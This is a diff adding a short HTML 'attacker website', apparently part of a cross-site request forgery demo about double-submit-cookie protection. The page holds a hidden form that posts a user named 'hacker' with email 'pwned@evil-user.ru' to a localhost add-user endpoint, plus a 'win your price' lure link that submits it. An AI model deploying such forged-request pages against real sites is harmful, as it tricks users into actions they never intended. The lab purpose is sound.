@@ -1,0 +1,22 @@
+<html lang=en>
+  <head>
+    <meta charset=utf-8>
+    <title>The Attacker Website</title>
+    <link rel="stylesheet" type="text/css" href="css/styles.css"/>
+    <style>
+      body {
+        border: 10px solid red
+      }
+    </style>
+  </head>
+  <body>
+    <h1>The Attacker Website (Double Submit Cookie)</h1>
+    <section>
+        <form method="post" action="http://localhost:3010/add-user">
+          <input name="name" type="hidden" value="hacker"></input>
+          <input name="email" type="hidden" value="pwned@evil-user.ru"></input>
+        </form>
+    </section>
+    <a href="#" onclick="document.forms[0].submit()"> 🎉 Click here to win your price 🎉</a>
+  </body>
+</html>
